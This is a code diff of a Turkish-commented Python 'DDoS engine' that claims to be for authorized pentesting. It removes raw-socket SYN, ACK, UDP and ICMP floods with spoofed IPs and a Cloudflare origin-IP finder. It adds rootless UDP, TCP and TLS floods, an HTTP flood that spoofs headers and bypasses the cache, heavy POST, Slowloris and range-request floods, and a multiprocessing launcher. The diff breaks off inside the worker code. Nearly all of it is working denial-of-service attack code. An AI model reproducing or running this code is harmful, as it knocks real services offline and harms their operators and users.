@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # ============================================================================
-# PROFESSIONAL MULTI-SOURCE DDoS ENGINE v5.0
+# ROOTSUZ DDoS ENGINE v5.1 - Max Performans
 # ============================================================================
-# Yetkili pentest için - Tüm hakları saklıdır
-# 3 farklı kaynak IP'den eş zamanlı saldırı
-# Cloudflare Bypass + Layer 4/7 Gerçek Paketler
+# Yetkili pentest için - Root GEREKMEZ
+# 3 kaynak IP'den spoofed saldırı
+# Layer 7 ağırlıklı + Layer 4 (rootsuz metodlar)
 # ============================================================================
 
 import socket
@@ -14,480 +14,273 @@ import random
 import time
 import sys
 import os
-import struct
 import ssl
 import urllib.request
 import urllib.error
 import hashlib
-import hmac
-import base64
-import json
+import http.client
+import multiprocessing
 from datetime import datetime
 from urllib.parse import urlparse
 
 # ==================== KONFİGÜRASYON ====================
 
-# KAYNAK IP'LER (bu IP'lerden saldırı yapılacak - SPOOF EDİLECEK)
+# KAYNAK IP'LER (header'larda kullanılacak)
 SOURCE_IPS = ["78.181.164.55", "192.168.1.140", "192.168.1.138"]
 
-# HEDEF (kullanıcı tarafından belirlenecek)
+# HEDEF
 TARGET = None
 TARGET_PORT = 80
 TARGET_IS_IP = False
 
 # PERFORMANS AYARLARI
-THREAD_COUNT = 5000         # Thread sayısı (çok yüksek)
-MAX_PACKET_SIZE = 65507     # Maksimum UDP paket boyutu
-SOCKET_TIMEOUT = 2
+MAX_THREADS = 2000         # Ana thread sayısı
+MAX_PROCESSES = 4          # Fork edilecek process sayısı (CPU çekirdeği kadar)
+SOCKET_TIMEOUT = 3
+CONNECTION_POOL_SIZE = 100
 
 # İSTATİSTİK
 total_packets = 0
 total_bytes = 0
+total_errors = 0
 stats_lock = threading.Lock()
 running = True
 start_time = 0
 
-# Cloudflare bypass listesi - gerçek IP bulma
-CLOUDFLARE_IPS = [
-    "173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22",
-    "103.31.4.0/22", "141.101.64.0/18", "108.162.192.0/18",
-    "190.93.240.0/20", "188.114.96.0/20", "197.234.240.0/22",
-    "198.41.128.0/17", "162.158.0.0/15", "104.16.0.0/13",
-    "104.24.0.0/14", "172.64.0.0/13", "131.0.72.0/22"
-]
+# Bağlantı havuzu
+connection_pools = {}
 
-def ip_to_int(ip):
-    """IP'yi integer'a çevir"""
-    parts = ip.split('.')
-    return (int(parts[0]) << 24) + (int(parts[1]) << 16) + (int(parts[2]) << 8) + int(parts[3])
-
-def is_cloudflare_ip(ip):
-    """IP Cloudflare'e ait mi kontrol et"""
-    try:
-        ip_int = ip_to_int(ip)
-        for cf_ip in CLOUDFLARE_IPS:
-            network, bits = cf_ip.split('/')
-            network_int = ip_to_int(network)
-            mask = (0xFFFFFFFF << (32 - int(bits))) & 0xFFFFFFFF
-            if (ip_int & mask) == (network_int & mask):
-                return True
-        return False
-    except:
-        return False
-
-def find_real_ip(domain):
-    """Cloudflare arkasındaki gerçek IP'yi bulmaya çalış"""
-    import subprocess
-    real_ips = set()
-    
-    # DNS kayıtlarını kontrol et
-    dns_servers = [
-        "8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9",
-        "208.67.222.222", "208.67.220.220"
-    ]
-    
-    # Farklı DNS sunucularından sorgula
-    for dns in dns_servers:
-        try:
-            result = subprocess.run(
-                ["nslookup", domain, dns],
-                capture_output=True, text=True, timeout=5
-            )
-            for line in result.stdout.split('\n'):
-                if 'Address:' in line:
-                    ip = line.split('Address:')[-1].strip()
-                    if ip and not ip.startswith('127.') and not ip.startswith('::'):
-                        if not is_cloudflare_ip(ip):
-                            real_ips.add(ip)
-        except:
-            pass
-    
-    # Subdomain enum
-    subdomains = ["www", "mail", "ftp", "admin", "cpanel", "webmail", 
-                  "direct", "cpcalendars", "cpcontacts", "autodiscover",
-                  "mx", "pop", "smtp", "ns1", "ns2", "ns3", "ns4",
-                  "vps", "server", "api", "dev", "test", "staging",
-                  "cdn", "static", "img", "images", "media"]
-    
-    for sub in subdomains:
-        try:
-            result = subprocess.run(
-                ["nslookup", f"{sub}.{domain}", "1.1.1.1"],
-                capture_output=True, text=True, timeout=3
-            )
-            for line in result.stdout.split('\n'):
-                if 'Address:' in line:
-                    ip = line.split('Address:')[-1].strip()
-                    if ip and not ip.startswith('127.') and not ip.startswith('::'):
-                        if not is_cloudflare_ip(ip):
-                            real_ips.add(ip)
-        except:
-            pass
-    
-    return list(real_ips)
-
-# ==================== ÇEKİRDEK PAKET MOTORU ====================
-
-def create_ip_header(src_ip, dst_ip, protocol, length):
-    """IP header oluştur"""
-    version_ihl = 0x45  # IPv4, 5x32bit header
-    tos = 0
-    total_length = length
-    identification = random.randint(0, 65535)
-    flags_fragment = 0
-    ttl = random.randint(128, 255)
-    protocol_num = protocol
-    header_checksum = 0
-    
-    saddr = socket.inet_aton(src_ip)
-    daddr = socket.inet_aton(dst_ip)
-    
-    ip_header = struct.pack('!BBHHHBBH4s4s',
-        version_ihl, tos, total_length,
-        identification, flags_fragment,
-        ttl, protocol_num, header_checksum,
-        saddr, daddr)
-    
-    # Checksum hesapla
-    checksum = calculate_checksum(ip_header)
-    ip_header = struct.pack('!BBHHHBBH4s4s',
-        version_ihl, tos, total_length,
-        identification, flags_fragment,
-        ttl, protocol_num, checksum,
-        saddr, daddr)
-    
-    return ip_header
-
-def calculate_checksum(data):
-    """IP/TCP/UDP checksum"""
-    if len(data) % 2 != 0:
-        data += b'\x00'
-    
-    total = 0
-    for i in range(0, len(data), 2):
-        word = (data[i] << 8) + data[i+1]
-        total += word
-    
-    total = (total >> 16) + (total & 0xFFFF)
-    total += total >> 16
-    return ~total & 0xFFFF
-
-def update_stats(packets, bytes_count):
-    """İstatistik güncelle"""
-    global total_packets, total_bytes
+def update_stats(packets=1, bytes_count=0, errors=0):
+    global total_packets, total_bytes, total_errors
     with stats_lock:
         total_packets += packets
         total_bytes += bytes_count
+        total_errors += errors
 
-# ==================== LAYER 4 SALDIRILARI ====================
+# ==================== LAYER 4 - ROOTSUZ METODLAR ====================
 
-def syn_flood_spoofed(target_ip, target_port, src_ip):
-    """SYN Flood - SPOOFED kaynak IP ile"""
+def udp_flood_noroot(target_ip, target_port, src_ip):
+    """UDP Flood - Rootsuz, maksimum boyutta"""
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         
-        # Rastgele kaynak port
-        src_port = random.randint(1024, 65535)
-        seq_num = random.randint(0, 0xFFFFFFFF)
+        # Maksimum yakın boyut
+        data = random._urandom(random.randint(1400, 65507))
         
-        # TCP Header (SYN=0x02)
-        tcp_header = struct.pack('!HHLLBBHHH',
-            src_port, target_port,
-            seq_num, 0,
-            5 << 4, 0x02,  # data offset=5, SYN flag
-            socket.htons(65535),  # window
-            0, 0)  # checksum=0, urgent ptr=0
+        # Hedef port - rastgele veya sabit
+        dst_port = target_port if target_port else random.randint(1, 65535)
         
-        # Pseudo header for TCP checksum
-        pseudo = struct.pack('!4s4sBBH',
-            socket.inet_aton(src_ip),
-            socket.inet_aton(target_ip),
-            0, socket.IPPROTO_TCP, len(tcp_header))
+        sock.sendto(data, (target_ip, dst_port))
+        sock.close()
         
-        pseudo += tcp_header
-        tcp_checksum = calculate_checksum(pseudo)
-        
-        tcp_header = struct.pack('!HHLLBBHHH',
-            src_port, target_port,
-            seq_num, 0,
-            5 << 4, 0x02,
-            socket.htons(65535),
-            tcp_checksum, 0)
-        
-        # IP header
-        ip_header = create_ip_header(src_ip, target_ip, socket.IPPROTO_TCP, 40)
-        
-        packet = ip_header + tcp_header
-        s.sendto(packet, (target_ip, 0))
-        s.close()
-        
-        update_stats(1, len(packet))
+        update_stats(1, 28 + len(data))
         return True
     except:
         return False
 
-def syn_flood_rapid(target_ip, target_port, src_ip):
-    """SYN Flood - Çok hızlı ardışık gönderim"""
+def udp_flood_burst(target_ip, target_port, src_ip):
+    """Burst UDP - peş peşe 50 paket"""
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         
-        src_port = random.randint(1024, 65535)
-        seq_num = random.randint(0, 0xFFFFFFFF)
-        
-        tcp_header = struct.pack('!HHLLBBHHH',
-            src_port, target_port, seq_num, 0,
-            5 << 4, 0x02, socket.htons(65535), 0, 0)
-        
-        pseudo = struct.pack('!4s4sBBH',
-            socket.inet_aton(src_ip), socket.inet_aton(target_ip),
-            0, socket.IPPROTO_TCP, len(tcp_header)) + tcp_header
-        tcp_checksum = calculate_checksum(pseudo)
-        
-        tcp_header = struct.pack('!HHLLBBHHH',
-            src_port, target_port, seq_num, 0,
-            5 << 4, 0x02, socket.htons(65535), tcp_checksum, 0)
-        
-        ip_header = create_ip_header(src_ip, target_ip, socket.IPPROTO_TCP, 40)
-        packet = ip_header + tcp_header
-        
-        # Aynı anda 10 paket gönder
-        for _ in range(10):
+        packets_sent = 0
+        for _ in range(50):
             try:
-                s.sendto(packet, (target_ip, 0))
-                update_stats(1, len(packet))
+                data = random._urandom(random.randint(1000, 1500))
+                dst_port = target_port if target_port else random.randint(1, 65535)
+                sock.sendto(data, (target_ip, dst_port))
+                packets_sent += 1
             except:
                 break
         
-        s.close()
+        sock.close()
+        update_stats(packets_sent, packets_sent * 1500)
+        return packets_sent > 0
+    except:
+        return False
+
+def tcp_syn_noroot(target_ip, target_port, src_ip):
+    """TCP SYN - Rootsuz (connect ile)"""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(1)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        
+        # Non-blocking connect
+        sock.setblocking(0)
+        try:
+            sock.connect((target_ip, target_port))
+        except BlockingIOError:
+            pass
+        
+        # Bağlantıyı yarım bırak
+        time.sleep(0.001)
+        sock.close()
+        
+        update_stats(1, 100)
         return True
     except:
         return False
 
-def udp_flood_max(target_ip, target_port, src_ip):
-    """UDP Flood - MAKSİMUM BOYUTTA paketler"""
+def tcp_connect_flood(target_ip, target_port, src_ip):
+    """TCP Connect Flood - gerçek bağlantı"""
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
-        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(SOCKET_TIMEOUT)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         
-        src_port = random.randint(1024, 65535)
-        dst_port = target_port if target_port else random.randint(1, 65535)
+        sock.connect((target_ip, target_port))
         
-        # Maksimum boyutta rastgele veri
-        data_size = random.randint(4096, MAX_PACKET_SIZE)
-        data = random._urandom(data_size)
+        # Küçük veri gönder
+        try:
+            sock.send(random._urandom(256))
+        except:
+            pass
         
-        # UDP header
-        udp_length = 8 + len(data)  # 8 byte header + data
-        udp_header = struct.pack('!HHHH', src_port, dst_port, udp_length, 0)
+        sock.close()
         
-        # UDP checksum with pseudo header
-        pseudo = struct.pack('!4s4sBBH',
-            socket.inet_aton(src_ip), socket.inet_aton(target_ip),
-            0, socket.IPPROTO_UDP, udp_length)
-        pseudo += udp_header + data
-        udp_checksum = calculate_checksum(pseudo)
-        
-        udp_header = struct.pack('!HHHH', src_port, dst_port, udp_length, udp_checksum)
-        
-        # IP header
-        total_length = 20 + len(udp_header) + len(data)
-        ip_header = create_ip_header(src_ip, target_ip, socket.IPPROTO_UDP, total_length)
-        
-        packet = ip_header + udp_header + data
-        s.sendto(packet, (target_ip, 0))
-        s.close()
-        
-        update_stats(1, len(packet))
+        update_stats(1, 1000)
         return True
     except:
+        update_stats(0, 0, 1)
         return False
 
-def icmp_flood_massive(target_ip, src_ip):
-    """ICMP Flood - Büyük paketler"""
+def tcp_ssl_connect(target_ip, target_port, src_ip):
+    """SSL/TLS Bağlantı Flood - HTTPS sunucuları için"""
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(SOCKET_TIMEOUT)
+        sock.connect((target_ip, target_port))
         
-        # ICMP Echo Request
-        icmp_type = 8
-        icmp_code = 0
-        icmp_id = random.randint(0, 65535)
-        icmp_seq = random.randint(0, 65535)
-        
-        # Büyük data
-        data = random._urandom(random.randint(1024, 8192))
-        
-        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, 0, icmp_id, icmp_seq)
-        icmp_packet = icmp_header + data
-        icmp_checksum = calculate_checksum(icmp_packet)
-        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
-        icmp_packet = icmp_header + data
-        
-        total_length = 20 + len(icmp_packet)
-        ip_header = create_ip_header(src_ip, target_ip, 1, total_length)  # ICMP protocol = 1
-        
-        packet = ip_header + icmp_packet
-        s.sendto(packet, (target_ip, 0))
-        s.close()
-        
-        update_stats(1, len(packet))
-        return True
-    except:
-        return False
-
-def tcp_ack_flood(target_ip, target_port, src_ip):
-    """TCP ACK Flood"""
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-        
-        src_port = random.randint(1024, 65535)
-        seq_num = random.randint(0, 0xFFFFFFFF)
-        ack_num = random.randint(0, 0xFFFFFFFF)
-        
-        tcp_header = struct.pack('!HHLLBBHHH',
-            src_port, target_port, seq_num, ack_num,
-            5 << 4, 0x10,  # ACK flag
-            socket.htons(65535), 0, 0)
-        
-        pseudo = struct.pack('!4s4sBBH',
-            socket.inet_aton(src_ip), socket.inet_aton(target_ip),
-            0, socket.IPPROTO_TCP, len(tcp_header)) + tcp_header
-        tcp_checksum = calculate_checksum(pseudo)
-        
-        tcp_header = struct.pack('!HHLLBBHHH',
-            src_port, target_port, seq_num, ack_num,
-            5 << 4, 0x10, socket.htons(65535), tcp_checksum, 0)
-        
-        ip_header = create_ip_header(src_ip, target_ip, socket.IPPROTO_TCP, 40)
-        packet = ip_header + tcp_header
-        
-        s.sendto(packet, (target_ip, 0))
-        s.close()
-        
-        update_stats(1, len(packet))
-        return True
-    except:
-        return False
-
-# ==================== LAYER 7 SALDIRILARI ====================
-
-def http_flood_advanced(target_url, src_ip):
-    """Gelişmiş HTTP Flood - Cloudflare bypass"""
-    try:
-        parsed = urlparse(target_url)
-        host = parsed.netloc or parsed.hostname
-        
-        # Gerçekçi browser fingerprint
-        user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
-            "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
-            "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.164 Mobile Safari/537.36",
-            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
-            "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
-            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"
-        ]
-        
-        # Rastgele path - cache bypass
-        random_paths = [
-            f"/?{int(time.time()*1000)}",
-            f"/?nocache={random.randint(100000,999999)}",
-            f"/?cache={hashlib.md5(str(random.random()).encode()).hexdigest()[:8]}",
-            f"/?ts={int(time.time())}&r={random.randint(1000,9999)}",
-            f"/api/v{random.randint(1,5)}/{random.randint(100,999)}",
-            f"/wp-content/themes/?v={random.randint(1,99)}.{random.randint(1,99)}",
-            f"/assets/css/main.css?v={random.randint(1,99999)}",
-            f"/index.php?option=com_{''.join(random.choices('abcdefgh', k=8))}&view={random.randint(1,100)}",
-            f"/?page_id={random.randint(1,9999)}&preview=true",
-            f"/category/{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3,10)))}/"
-        ]
-        
-        path = random.choice(random_paths)
-        
-        if target_url.endswith('/'):
-            full_url = f"{target_url.rstrip('/')}{path}"
-        else:
-            full_url = f"{target_url}{path}"
-        
-        req = urllib.request.Request(full_url)
-        req.add_header('User-Agent', random.choice(user_agents))
-        req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7')
-        req.add_header('Accept-Language', random.choice(['en-US,en;q=0.9', 'tr-TR,tr;q=0.9,en;q=0.8', 'de-DE,de;q=0.9,en;q=0.8', 'fr-FR,fr;q=0.9,en;q=0.8', 'ar-SA,ar;q=0.9,en;q=0.8']))
-        req.add_header('Accept-Encoding', 'gzip, deflate, br')
-        req.add_header('Connection', random.choice(['keep-alive', 'close']))
-        req.add_header('Cache-Control', 'no-cache, no-store, must-revalidate, max-age=0')
-        req.add_header('Pragma', 'no-cache')
-        req.add_header('X-Forwarded-For', src_ip)
-        req.add_header('X-Real-IP', src_ip)
-        req.add_header('X-Originating-IP', src_ip)
-        req.add_header('Client-IP', src_ip)
-        req.add_header('X-Client-IP', src_ip)
-        req.add_header('CF-Connecting-IP', src_ip)
-        req.add_header('True-Client-IP', src_ip)
-        req.add_header('X-Forwarded-Host', host)
-        req.add_header('X-Forwarded-Proto', 'https' if target_url.startswith('https') else 'http')
-        req.add_header('Referer', random.choice([
-            f'https://www.google.com/search?q={random.choice(["security","hacking","pentest","cyber"])}',
-            f'https://{host}/',
-            f'https://www.bing.com/search?q={random.randint(0,9999)}',
-            f'https://t.co/{hashlib.md5(str(random.random()).encode()).hexdigest()[:8]}'
-        ]))
-        req.add_header('Sec-Fetch-Dest', 'document')
-        req.add_header('Sec-Fetch-Mode', 'navigate')
-        req.add_header('Sec-Fetch-Site', random.choice(['none', 'same-origin', 'cross-site']))
-        req.add_header('Sec-Fetch-User', '?1')
-        req.add_header('Sec-Ch-Ua', '"Chromium";v="121", "Google Chrome";v="121", "Not=A?Brand";v="99"')
-        req.add_header('Sec-Ch-Ua-Mobile', '?0')
-        req.add_header('Sec-Ch-Ua-Platform', random.choice(['"Windows"', '"macOS"', '"Linux"', '"Android"']))
-        req.add_header('DNT', '1')
-        req.add_header('Upgrade-Insecure-Requests', '1')
-        
-        # SSL context - sertifika doğrulamasını atla
+        # SSL握手 - sunucuyu yorar
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
         
+        try:
+            ssl_sock = ctx.wrap_socket(sock, server_hostname=target_ip)
+            ssl_sock.close()
+        except:
+            sock.close()
+        
+        update_stats(1, 5000)
+        return True
+    except:
+        update_stats(0, 0, 1)
+        return False
+
+# ==================== LAYER 7 - PROFESYONEL METODLAR ====================
+
+def http_attack_advanced(target_url, src_ip):
+    """Gelişmiş HTTP Flood - çoklu header, cache bypass"""
+    try:
+        parsed = urlparse(target_url)
+        host = parsed.netloc or parsed.hostname
+        path = parsed.path or '/'
+        
+        # Rastgele path oluştur
+        random.seed(time.time() * random.randint(1, 1000))
+        paths = [
+            f"{path}?{random.randint(100000,999999)}={random.randint(100000,999999)}",
+            f"{path}?nocache={int(time.time()*1000)}",
+            f"{path}?cb={hashlib.md5(str(random.random()).encode()).hexdigest()[:12]}",
+            f"{path}?v={random.randint(1,999)}.{random.randint(1,999)}",
+            f"{path}/?s={''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))}",
+            f"/{random.choice(['api','wp-content','assets','images','css','js','uploads'])}/{random.randint(1000,9999)}.{random.choice(['php','html','js','css','jpg','png'])}",
+            f"/?page={random.randint(1,100)}&perpage={random.randint(10,100)}",
+            f"/index.php?option=com_{''.join(random.choices('abcdefgh', k=6))}&task=view&id={random.randint(1,9999)}"
+        ]
+        attack_path = random.choice(paths)
+        
+        if target_url.endswith('/'):
+            full_url = f"{target_url.rstrip('/')}{attack_path}"
+        else:
+            full_url = f"{target_url}{attack_path}"
+        
+        # Gerçekçi headers
+        headers = {
+            'User-Agent': random.choice([
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
+                'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
+                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
+                'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.164 Mobile Safari/537.36',
+                'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0'
+            ]),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': random.choice(['en-US,en;q=0.9', 'tr-TR,tr;q=0.9,en;q=0.8', 'de-DE,de;q=0.9,en;q=0.8', 'fr-FR,fr;q=0.9,en;q=0.8']),
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': random.choice(['keep-alive', 'close']),
+            'Cache-Control': 'no-cache, no-store, must-revalidate',
+            'Pragma': 'no-cache',
+            'X-Forwarded-For': src_ip,
+            'X-Real-IP': src_ip,
+            'X-Originating-IP': src_ip,
+            'Client-IP': src_ip,
+            'X-Client-IP': src_ip,
+            'CF-Connecting-IP': src_ip,
+            'True-Client-IP': src_ip,
+            'Referer': random.choice([
+                f'https://www.google.com/search?q={random.choice(["security", "test", "bypass"])}',
+                f'https://{host}/',
+                f'https://t.co/{hashlib.md5(str(random.random()).encode()).hexdigest()[:8]}'
+            ]),
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': random.choice(['none', 'same-origin']),
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1',
+            'DNT': '1'
+        }
+        
+        # SSL Context
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        
+        req = urllib.request.Request(full_url, headers=headers)
         response = urllib.request.urlopen(req, timeout=SOCKET_TIMEOUT, context=ctx)
         data = response.read()
         response.close()
         
         update_stats(1, len(data) + 2000)
         return True
-    except:
+    except Exception as e:
+        update_stats(0, 0, 1)
         return False
 
-def http_post_massive(target_url, src_ip):
-    """HTTP POST ile büyük veri gönderimi"""
+def http_post_heavy(target_url, src_ip):
+    """Ağır HTTP POST - büyük veri yükle"""
     try:
-        # 64KB - 256KB arası rastgele veri
-        data_size = random.randint(65536, 262144)
-        post_data = random._urandom(data_size)
+        # 32KB - 128KB arası veri
+        post_size = random.randint(32768, 131072)
+        post_data = random._urandom(post_size)
         
         boundary = f"----WebKitFormBoundary{hashlib.md5(str(random.random()).encode()).hexdigest()[:16]}"
+        
         body = (
             f"--{boundary}\r\n"
-            f"Content-Disposition: form-data; name=\"file\"; filename=\"{hashlib.md5(str(random.random()).encode()).hexdigest()[:10]}.bin\"\r\n"
+            f"Content-Disposition: form-data; name=\"filedata\"; filename=\"data_{random.randint(1000,9999)}.bin\"\r\n"
             f"Content-Type: application/octet-stream\r\n\r\n"
         ).encode() + post_data + f"\r\n--{boundary}--\r\n".encode()
         
-        req = urllib.request.Request(target_url, data=body)
-        req.add_header('User-Agent', f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0")
-        req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
-        req.add_header('Content-Length', str(len(body)))
-        req.add_header('Connection', 'keep-alive')
-        req.add_header('X-Forwarded-For', src_ip)
-        req.add_header('Expect', '')
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0',
+            'Content-Type': f'multipart/form-data; boundary={boundary}',
+            'Content-Length': str(len(body)),
+            'Connection': 'close',
+            'X-Forwarded-For': src_ip,
+            'Expect': ''
+        }
         
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
         
+        req = urllib.request.Request(target_url, data=body, headers=headers)
         response = urllib.request.urlopen(req, timeout=SOCKET_TIMEOUT*2, context=ctx)
         response.read()
         response.close()
@@ -495,28 +288,28 @@ def http_post_massive(target_url, src_ip):
         update_stats(1, len(body) + 500)
         return True
     except:
+        update_stats(0, 0, 1)
         return False
 
-def http_slow_read(target_url, src_ip):
-    """Slow Read attack - çok yavaş okuyarak bağlantıları tüket"""
+def http_slowloris(target_url, src_ip):
+    """Slowloris - bağlantıları açık tut, yavaş gönder"""
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(30)
-        
         parsed = urlparse(target_url)
         host = parsed.netloc or parsed.hostname
         port = parsed.port or (443 if target_url.startswith('https') else 80)
         path = parsed.path or '/'
         
-        s.connect((host, port))
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(60)
+        sock.connect((host, port))
         
         if target_url.startswith('https'):
             ctx = ssl.create_default_context()
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
-            s = ctx.wrap_socket(s, server_hostname=host)
+            sock = ctx.wrap_socket(sock, server_hostname=host)
         
-        # Normal GET isteği
+        # Kısmi HTTP isteği gönder
         request = (
             f"GET {path}?{random.randint(0,999999)} HTTP/1.1\r\n"
             f"Host: {host}\r\n"
@@ -524,42 +317,185 @@ def http_slow_read(target_url, src_ip):
             f"Accept: */*\r\n"
             f"X-Forwarded-For: {src_ip}\r\n"
             f"Connection: keep-alive\r\n"
+        )
+        
+        sock.send(request.encode())
+        
+        # Yavaş yavaş header ekle
+        for _ in range(random.randint(50, 200)):
+            try:
+                time.sleep(random.uniform(0.5, 3))
+                sock.send(f"X-Random-{random.randint(0,9999)}: {random.randint(0,9999)}\r\n".encode())
+            except:
+                break
+        
+        sock.close()
+        update_stats(1, 5000)
+        return True
+    except:
+        update_stats(0, 0, 1)
+        return False
+
+def http_range_flood(target_url, src_ip):
+    """Range Request Flood - byte range ile parçalı istek"""
+    try:
+        parsed = urlparse(target_url)
+        host = parsed.netloc or parsed.hostname
+        port = parsed.port or (443 if target_url.startswith('https') else 80)
+        path = parsed.path or '/'
+        
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(SOCKET_TIMEOUT)
+        sock.connect((host, port))
+        
+        if target_url.startswith('https'):
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            sock = ctx.wrap_socket(sock, server_hostname=host)
+        
+        # Rastgele byte range
+        start_range = random.randint(0, 1000000)
+        end_range = start_range + random.randint(100, 50000)
+        
+        request = (
+            f"GET {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"User-Agent: Mozilla/5.0\r\n"
+            f"Range: bytes={start_range}-{end_range}\r\n"
+            f"X-Forwarded-For: {src_ip}\r\n"
+            f"Connection: close\r\n"
             f"\r\n"
         )
         
-        s.send(request.encode())
+        sock.send(request.encode())
         
-        # Çok yavaş oku (bir byte al, 30sn bekle)
         try:
-            data = s.recv(1)
-            time.sleep(random.uniform(10, 30))
-            if data:
-                s.recv(random.randint(1, 100))
-                time.sleep(random.uniform(5, 15))
+            response = sock.recv(4096)
         except:
             pass
         
-        s.close()
+        sock.close()
         update_stats(1, 2000)
         return True
     except:
+        update_stats(0, 0, 1)
         return False
 
-# ==================== İSTATİSTİK EKRANI ====================
+# ==================== MULTIPROCESSING YÖNETİCİ ====================
 
-def stats_display():
-    """Gerçek zamanlı istatistik gösterimi"""
-    global running, total_packets, total_bytes, start_time
+def worker_process(target, port, attack_mode, target_url, src_ip, process_id):
+    """Her process için worker"""
+    global running
+    
+    # Process bazında random seed
+    random.seed(os.getpid() + int(time.time()))
+    
+    threads = []
+    threads_per_process = MAX_THREADS // (MAX_PROCESSES * len(SOURCE_IPS))
+    if threads_per_process < 10:
+        threads_per_process = 10
+    
+    def layer4_worker_udp():
+        while running:
+            udp_flood_noroot(target, port, src_ip)
+    
